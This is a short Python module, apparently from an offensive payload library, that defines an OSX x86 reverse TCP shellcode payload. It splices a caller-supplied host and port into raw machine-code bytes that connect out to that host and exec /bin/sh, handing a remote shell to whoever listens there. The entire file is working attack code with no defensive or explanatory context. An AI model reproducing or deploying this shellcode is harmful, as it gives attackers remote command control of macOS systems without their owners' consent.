from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Unkown"
    Shellcode.info["name"] = "OSX86 - reverse_tcp shellcode"
    Shellcode.info["size"] = 68

    def __init__(self, **kwargs): 
        Shellcode.info["payload"] = [
            r"\x68"
            + kwargs["host"] +
            r"\x68\xff\x02"
            + kwargs["lport"] +
            r"\x89\xe7\x31\xc0" 
            r"\x50\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50" 
            r"\x6a\x62\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8" 
            r"\x79\xf6\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" 
            r"\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80"

        ]
